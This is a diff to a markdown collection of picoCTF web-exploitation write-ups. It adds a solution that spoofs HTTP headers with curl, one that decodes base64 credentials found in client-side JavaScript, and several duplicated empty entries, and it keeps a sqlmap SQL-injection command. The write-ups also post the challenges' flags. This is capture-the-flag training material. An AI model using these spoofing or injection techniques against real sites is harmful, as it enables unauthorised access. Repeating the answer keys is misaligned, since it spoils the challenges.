@@ -34,6 +34,9 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 - [X marks the spot (2021)](#x-marks-the-spot)
 - [Web Gauntlet 3 (2021)](#web-gauntlet-3)
 - [Bithug (2021)](#bithug)
+- [login (2021)](#login)
+- [caas (2021)](#caas)
+- [notepad (2021)](#notepad)
 
 
 ---
@@ -722,7 +725,7 @@ This challenge presents a webpage with a login subpage, login.html.  This webpag
 
 The hints suggest that there is a backend database so this website is likely exploitable using SQL injection.
 
-We can use [sqlmap](http://sqlmap.org/) to identify the database type and data fields:
+We can use [sqlmap](#http://sqlmap.org/) to identify the database type and data fields:
 
 ~~~shell
 $ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
@@ -3028,6 +3031,115 @@ Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/
 
 <summary markdown="span">Solution 1</summary>
 
+If we visit the website, we get the message "Only people who use the official PicoBrowser are allowed on this site!".  This is shown in the HTML source:
+
+~~~html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Who are you?</title>
+
+
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+
+    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+</head>
+
+<body>
+
+    <div class="container">
+      <div class="jumbotron">
+        <p class="lead"></p>
+		<div class="row">
+			<div class="col-xs-12 col-sm-12 col-md-12">
+				<h3 style="color:red">Only people who use the official PicoBrowser are allowed on this site!</h3>
+			</div>
+		</div>
+		<br/>
+		
+			<img src="/static/who_r_u.gif"></img>
+		
+	</div>
+    <footer class="footer">
+        <p>&copy; PicoCTF</p>
+    </footer>
+
+</div>
+<script>
+$(document).ready(function(){
+    $(".close").click(function(){
+        $("myAlert").alert("close");
+    });
+});
+</script>
+</body>
+
+</html>
+~~~
+
+We can isolate this header content in curl:
+
+~~~shell
+$ curl -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+Only people who use the official PicoBrowser are allowed on this site!
+~~~
+
+The user agent for curl can be changed using the -A flag:
+
+~~~shell
+$ curl -A "picobrowser" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+I don&#39;t trust users visiting from another site.
+~~~
+
+We need to appear to be refered from the same website.  The referer can be set in curl using the -e flag:
+
+~~~shell
+$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+Sorry, this site only worked in 2018.
+~~~
+
+We now need to change the date of the request;  this can be done in curl using the header flag -H which enables us to inject headers into the query:
+
+~~~shell
+$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+I don&#39;t trust users who can be tracked.
+~~~
+
+Again, the Do Not Track header can be added:
+
+~~~shell
+$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+This website is only for people from Sweden.
+~~~
+	
+We now need to appear to visit from Sweden. We can add a X-Forwarded-For header with a Swedish IP address:
+
+~~~shell
+$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -H "X-Forwarded-For: 95.199.152.150" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+You&#39;re in Sweden but you don&#39;t speak Swedish?
+~~~
+
+The language can be changed using the Accept-Language header with the language code sv:
+
+~~~shell
+$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -H "X-Forwarded-For: 95.199.152.150" -H "Accept-Language: sv" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
+<h3 style="color:green">What can I say except, you are welcome</h3>
+<b>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}</b>
+~~~
+
+This gives us the flag:
+
+~~~
+picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}
+~~~
+
 </details>
 
 ### Answer
@@ -3037,7 +3149,7 @@ Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}
 ~~~
 
 </details>
@@ -3365,6 +3477,185 @@ picoCTF{}
 ### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
 
 ---
+
+## Bithug
+
+- Author: ZWAD3
+- 500 Points
+
+### Description
+
+Code management software is way too bloated. Try our new lightweight solution, BitHug.
+Source: distribution.tgz
+
+### Hints
+
+1. Every user gets their own target repository to attack called _/.git, but no permission to read it
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## login
+
+- Author: BrownieInMotion
+- 100 Points
+
+### Description
+
+My dog-sitter's brother made this website but I can't get in; can you help?
+
+login.mars.picoctf.net
+
+### Hints
+
+None
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+If we inspect the source for the webpage we can see a javascript source:
+	
+~~~html
+<!doctype html>
+<html>
+    <head>
+        <link rel="stylesheet" href="styles.css">
+        <script src="index.js"></script>
+    </head>
+    <body>
+        <div>
+          <h1>Login</h1>
+          <form method="POST">
+            <label for="username">Username</label>
+            <input name="username" type="text"/>
+            <label for="username">Password</label>
+            <input name="password" type="password"/>
+            <input type="submit" value="Submit"/>
+          </form>
+        </div>
+    </body>
+</html>
+~~~
+
+The javascript source can be viewed in a browser:
+
+~~~js
+(async()=>{await new Promise((e=>window.addEventListener("load",e))),document.querySelector("form").addEventListener("submit",(e=>{e.preventDefault();const r={u:"input[name=username]",p:"input[name=password]"},t={};for(const e in r)t[e]=btoa(document.querySelector(r[e]).value).replace(/=/g,"");return"YWRtaW4"!==t.u?alert("Incorrect Username"):"cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ"!==t.p?alert("Incorrect Password"):void alert(`Correct Password! Your flag is ${atob(t.p)}.`)}))})();
+~~~
+
+To make this easier to read, we can use a [deobfuscator](#https://deobfuscate.io/) to show us a formatted version
+
+~~~js
+(async () => {
+  await new Promise(e => window.addEventListener("load", e)), document.querySelector("form").addEventListener("submit", e => {
+    e.preventDefault();
+    const r = {u: "input[name=username]", p: "input[name=password]"}, t = {};
+    for (const e in r) t[e] = btoa(document.querySelector(r[e]).value).replace(/=/g, "");
+    return "YWRtaW4" !== t.u ? alert("Incorrect Username") : "cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ" !== t.p ? alert("Incorrect Password") : void alert(`Correct Password! Your flag is ${atob(t.p)}.`);
+  });
+})();
+~~~
+
+We can see the username and password are iterated through to generate a base64 encoded string which is used to validate the logon details.  We can use an [online base64 decoder](#https://www.base64decode.org/) to view the original strings:
+
+~~~
+YWRtaW4 => admin
+cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ => picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+~~~
+
+This gives us the flag:
+
+~~~
+picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+
+## Bithug
+
+- Author: ZWAD3
+- 500 Points
+
+### Description
+
+Code management software is way too bloated. Try our new lightweight solution, BitHug.
+Source: distribution.tgz
+
+### Hints
+
+1. Every user gets their own target repository to attack called _/.git, but no permission to read it
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{}
+~~~
+
+</details>
+
+---
+
+### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
 
 ## Bithug
 
